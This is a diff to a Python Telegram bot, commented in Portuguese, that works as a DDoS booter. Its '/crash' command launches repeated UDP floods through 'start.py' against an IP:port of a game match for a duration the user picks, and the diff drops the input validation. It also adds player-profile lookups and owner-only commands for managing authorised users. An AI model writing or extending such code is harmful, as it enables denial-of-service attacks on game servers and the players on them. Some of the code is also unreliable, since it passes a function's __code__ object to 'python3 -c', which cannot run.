@@ -43,14 +43,23 @@ def manage_attacks():
         oldest_process.terminate()
         del processos[list(processos.keys())[0]]
 
+# Função de ataque contínuo
+def ataque_continuo(ip_porta, tempo=900):
+    for _ in range(tempo // 5):
+        subprocess.Popen(f"python3 start.py UDP {ip_porta} 10 900", shell=True)
+        time.sleep(5)
+    if ip_porta in processos:
+        del processos[ip_porta]
+
 # Comando /menu
 @bot.message_handler(commands=['menu'])
 def menu(message):
-    menu_text = (
+    welcome_text = (
         "Bem-vindo ao bot! 🚀\n\n"
         "Aqui estão os comandos disponíveis para você:\n\n"
         "*Comandos básicos:*\n"
-        "`/crash <IP da partida>` - Envia um ataque ao IP especificado por 900 segundos.\n"
+        "`/crash <IP da partida> [tempo]` - Envia um ataque ao IP especificado. "
+        "(Padrão 900 segundos)\n"
         "`/meuid` - Mostra seu ID de usuário.\n"
         "`/info_player <ID>` - Exibe informações de um jogador por ID.\n\n"
         "*Comandos para o dono do bot:*\n"
@@ -61,7 +70,7 @@ def menu(message):
         "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
         "_Se precisar de ajuda, estou à disposição!_ 😉"
     )
-    bot.send_message(message.chat.id, menu_text, parse_mode="MarkdownV2")
+    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
 
 # Comando /info_player
 @bot.message_handler(commands=['info_player'])
@@ -89,6 +98,7 @@ def info_player(message):
                 elite_pass_status = player_info["PlayerElitePass"].get("Status", "Desconhecido")
                 elite_pass_level = player_info["PlayerElitePass"].get("Level", "Desconhecido")
                 weapon_skin_shows = player_info.get("weaponSkinShows", "Nenhuma")
+                # Convertendo o timestamp de "Último Login" para uma data legível
                 if last_login != "Desconhecido":
                     last_login = datetime.utcfromtimestamp(int(last_login)).strftime('%Y-%m-%d %H:%M:%S')
                 
@@ -105,6 +115,21 @@ def info_player(message):
                     f"🎖️ **Elite Pass Level:** {elite_pass_level}\n"
                     f"🗡️ **Skin de Arma:** {weapon_skin_shows}\n"
                 )
+
+                # Verificando se "clothes" existe antes de tentar acessar
+                clothes_images = data["data"].get("ProfileInfo", {}).get("clothes", {}).get("images", [])
+                if clothes_images:
+                    response_text += "\n**Roupas equipadas:**\n"
+                    for img in clothes_images:
+                        response_text += f"![Roupas]({img})\n"
+
+                # Habilidades equipadas
+                equipped_skills = data["data"]["ProfileInfo"].get("equippedSkills", [])
+                if equipped_skills:
+                    response_text += "\n**Habilidades Equipadas:**\n"
+                    for skill in equipped_skills:
+                        response_text += f"- {skill}\n"
+
                 bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
             else:
                 bot.send_message(message.chat.id, "Jogador não encontrado ou erro na API.")
@@ -122,41 +147,82 @@ def crash_server(message):
 
     comando = message.text.split()
     if len(comando) < 2:
-        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida>")
+        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida> [tempo]")
         return
 
     ip_porta = comando[1]
-    tempo = "900"
+    tempo = 900  # Padrão 900 segundos
 
-    if not validar_ip_porta(ip_porta):
-        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
-        return
+    if len(comando) == 3:
+        try:
+            tempo = int(comando[2])
+        except ValueError:
+            bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
+            return
 
     if ip_porta in processos:
         bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
         return
 
-    manage_attacks()
-
-    def ataque_continuo():
-        for _ in range(int(tempo) // 5):
-            subprocess.Popen(f"python3 start.py UDP {ip_porta} 10 900", shell=True)
-            time.sleep(5)
-        del processos[ip_porta]
-
-    processo = subprocess.Popen(["python3", "-c", ataque_continuo])
+    # Gerenciar ataque contínuo
+    processo = subprocess.Popen(["python3", "-c", f"import time; {ataque_continuo.__code__}"])
     processos[ip_porta] = processo
     bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {tempo} segundos.")
 
-# Demais comandos mantidos iguais
+# Comando /meuid
+@bot.message_handler(commands=['meuid'])
+def send_user_id(message):
+    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")
 
+# Comando /adduser e /removeuser
+@bot.message_handler(commands=['adduser', 'removeuser'])
+def admin_commands(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Acesso negado.")
+        return
+
+    comando = message.text.split()
+    if len(comando) != 2:
+        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>, /removeuser <ID>")
+        return
+
+    try:
+        usuario_id = int(comando[1])
+    except ValueError:
+        bot.send_message(message.chat.id, "ID inválido. Por favor, insira um número válido.")
+        return
+
+    if comando[0] == "/adduser":
+        if usuario_id not in authorized_users:
+            authorized_users.append(usuario_id)
+            salvar_usuarios()
+            bot.send_message(message.chat.id, f"Usuário {usuario_id} adicionado com sucesso.")
+        else:
+            bot.send_message(message.chat.id, "Usuário já autorizado.")
+    
+    elif comando[0] == "/removeuser":
+        if usuario_id in authorized_users:
+            authorized_users.remove(usuario_id)
+            salvar_usuarios()
+            bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
+        else:
+            bot.send_message(message.chat.id, "Usuário não encontrado na lista de autorizados.")
+            # Comando /listusers
+@bot.message_handler(commands=['listusers'])
+def list_users(message):
+    if message.from_user.id != SEU_ID_TELEGRAM:
+        bot.send_message(message.chat.id, "Acesso negado.")
+        return
+
+    if not authorized_users:
+        bot.send_message(message.chat.id, "Não há usuários autorizados.")
+    else:
+        user_list = "\n".join([str(user) for user in authorized_users])
+        bot.send_message(message.chat.id, f"Usuários autorizados:\n{user_list}")
+
+# Função principal
 def main():
-    while True:
-        try:
-            bot.polling(non_stop=True, timeout=60)
-        except Exception as e:
-            print(f"Erro no bot: {e}")
-            time.sleep(15)
+    bot.polling(none_stop=True)
 
 if __name__ == "__main__":
     main()
